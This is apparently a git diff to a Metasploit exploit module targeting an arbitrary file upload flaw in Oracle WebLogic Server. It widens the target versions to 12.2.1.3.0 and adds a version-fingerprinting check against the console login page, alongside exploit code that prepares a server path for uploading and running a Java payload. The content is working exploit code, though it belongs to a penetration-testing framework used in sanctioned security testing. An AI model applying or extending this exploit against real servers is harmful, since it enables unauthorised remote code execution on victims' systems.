@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Exploit::Remote
       'Name'           => 'Oracle WebLogic Server JKS Keystores File Upload and Execute',
       'Description'    => %q{
         This module exploits a arbitrary file upload vulnerability in Oracle WebLogic Server
-       12.1.3.0.0. 
+       12.1.3.0.0/12.2.1.3.0. 
       },
       'Author'         => [ 'Mario Ceballos' ],
       'License'        => 'BSD_LICENSE',
@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Exploit::Remote
         ],
       'Targets'        =>
         [
-          [ 'Oracle WebLogic Server 12.1.3.0.0',
+          [ 'Oracle WebLogic Server 12.1.3.0.0 || Oracle WebLogic Server 12.2.1.3.0',
             {
               'Arch'     => ARCH_JAVA,
               'Payload'  =>
@@ -46,6 +46,15 @@ class MetasploitModule < Msf::Exploit::Remote
     register_options( [ Opt::RPORT(7001) ], self.class )
   end
 
+  def check
+   res = send_request_raw({'uri'=>'/console/login/LoginForm.jsp'})
+   if res and res.body.include?("12.2.1.3.0") or res.body.include?("12.1.3.0.0")
+     print_status "#{res.body.match(/WebLogic Server Version: \d+((.*)\d+)?/)}"
+    return Exploit::CheckCode::Vulnerable
+   end
+   Exploit::CheckCode::Safe
+  end
+
   def exploit
    print_status "Obtaining current working directory..."
    res = send_request_raw({
@@ -62,6 +71,7 @@ class MetasploitModule < Msf::Exploit::Remote
      print_good "#{cwd}"
      print_status "Setting New Working Directory..."
      # WebLogic Server Version: 12.1.3.0.0
+     # WebLogic Server Version: 12.2.1.3.0
      newcwd = cwd.to_s + "/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/"
      print_good "#{newcwd}"
 
